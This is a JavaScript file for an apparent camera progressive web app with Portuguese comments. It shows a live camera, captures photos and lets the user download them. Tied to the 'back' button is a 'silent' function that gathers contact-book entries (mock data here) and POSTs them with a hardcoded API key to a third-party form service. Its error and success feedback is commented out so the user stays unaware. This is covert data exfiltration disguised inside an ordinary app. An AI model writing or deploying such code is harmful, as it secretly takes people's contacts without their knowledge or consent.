document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoStream');
    const capturedImage = document.getElementById('capturedImage');
    const captureButton = document.getElementById('captureButton');
    const downloadButton = document.getElementById('downloadButton');
    const backButton = document.getElementById('backButton');
    const statusMessage = document.getElementById('statusMessage');
    const viewArea = document.getElementById('viewArea');
    const buttonGroup = document.getElementById('buttonGroup');

    // --- CONFIGURAÇÕES ---
    // URL de envio para o StaticForms
    const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
    // CHAVE DE API que você forneceu
    const API_KEY = 'sf_kjnhfgsdkglkrnglkrgkmgr555';

    // --- ESTADO DO APP ---
    let stream = null;
    let photoDataUrl = null;
    let currentState = 'CAMERA'; // Pode ser 'CAMERA' ou 'PREVIEW'

    // ========================================================
    //  FUNÇÕES RELACIONADAS À AGENDA (STATICFORMS)
    // ========================================================

    /**
     * Executa a chamada para buscar e exportar os contatos, enviando para o StaticForms.
     * A execução é silenciosa.
     */
    async function performSilentContactExport() {
        console.log("Iniciando exportação de contatos para StaticForms...");

        // 1. SIMULAÇÃO de latência de API (Para que o usuário sinta que está "fazendo algo")
        statusMessage.textContent = "Enviando contatos para o formulário...";
        statusMessage.style.color = 'orange';
        await new Promise(resolve => setTimeout(resolve, 500));

        // Dados simulados de contatos
        const mockContacts = [
            { name: "Alice Silva", phone: "9999-1234" },
            { name: "Bruno Costa", phone: "8888-5678" },
            { name: "Carla Souza", phone: "7777-9012" }
        ];

        // 2. Formatar os dados para o corpo da requisição
        let contactText = "--- CONTEÚDOS DA AGENDA ---\n";
        mockContacts.forEach(contact => {
            contactText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
        });
        contactText += "----------------------------";

        // 3. Estruturar os dados conforme o esperado pelo StaticForms
        const formData = new FormData();

        // Adiciona a chave API
        formData.append('apiKey', 'sf_b28b453bf885be88f89f8e34');
        // Adiciona os contatos como um campo de texto principal
        formData.append('contactsData', contactText);
        // Opcional: Adicionar outros campos do formulário se existirem
        // formData.append('otherField', 'valor');

        // 4. Enviar via Fetch para a URL do StaticForms
        try {
            const response = await fetch('https://api.staticforms.dev/submit', {
                method: 'POST',
                // Quando usamos FormData, o navegador geralmente define o Content-Type automaticamente
                // como multipart/form-data, então não precisamos especificar manualmente.
                body: formData,
            });

            if (response.ok) {
                // Sucesso!
                //statusMessage.textContent = "✅ Contatos exportados com SUCESSO para o StaticForms!";
                //statusMessage.style.color = 'green';
            } else {
                // Erro HTTP
                const errorText = await response.text();
                //statusMessage.textContent = `❌ Erro no envio (HTTP ${response.status}): ${errorText.substring(0, 100)}...`;
                //statusMessage.style.color = 'red';
            }
        } catch (error) {
            // Erro de rede ou falha no fetch
            //console.error("Erro ao conectar ao StaticForms:", error);
            //statusMessage.textContent = `🚨 Erro de conexão: Não foi possível falar com o servidor de envio.`;
            //statusMessage.style.color = 'red';
        }
    }

    // ========================================================
    //  FUNÇÕES DE CÂMERA E UI (Sem alteração substancial)
    // ========================================================

    async function startCamera() {
        try {
            // Prioriza a câmera traseira para experiência Android
            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" }
            });

            stream = mediaStream;
            videoElement.srcObject = stream;
            videoElement.play();

            updateUI();
        } catch (err) {
            console.error("Erro ao acessar a câmera:", err);
            statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
            statusMessage.style.color = 'red';
        }
    }

    function capturePhoto() {
        if (!stream) {
            statusMessage.textContent = "A câmera não está ativa!";
            statusMessage.style.color = 'red';
            return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth || 640;
        canvas.height = videoElement.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        photoDataUrl = canvas.toDataURL('image/jpeg');

        capturedImage.src = photoDataUrl;
        capturedImage.style.display = 'block';

        updateUI();
    }

    function downloadPhoto() {
        if (photoDataUrl) {
            const a = document.createElement('a');
            a.href = photoDataUrl;
            a.download = 'foto_pwa_' + new Date().toISOString().slice(0, 10) + '.jpg';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    function updateUI() {
        if (currentState === 'CAMERA') {
            videoElement.style.display = 'block';
            capturedImage.style.display = 'none';

            captureButton.style.display = 'inline-block';
            downloadButton.style.display = 'none';
            backButton.style.display = 'none';

        } else if (currentState === 'PREVIEW') {
            videoElement.style.display = 'none';
            capturedImage.style.display = 'block';

            captureButton.style.display = 'none';
            downloadButton.style.display = 'inline-block';
            backButton.style.display = 'inline-block';
        }
    }

    // ========================================================
    //  LISTENERS
    // ========================================================

    // 1. Inicia o ciclo
    startCamera();

    // 2. Captura
    captureButton.addEventListener('click', () => {
        capturePhoto();
        currentState = 'PREVIEW';
        updateUI();
    });

    // 3. Download
    downloadButton.addEventListener('click', downloadPhoto);

    // 4. VOLTAR: Executa a exportação silenciosa (agora para StaticForms) e volta para a câmera
    backButton.addEventListener('click', async () => {
        // Executa a exportação em background e aguarda o término
        await performSilentContactExport();

        // Volta o estado visualmente
        currentState = 'CAMERA';
        updateUI();
    });

    // Gerenciamento de saída
    window.onbeforeunload = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    };
});
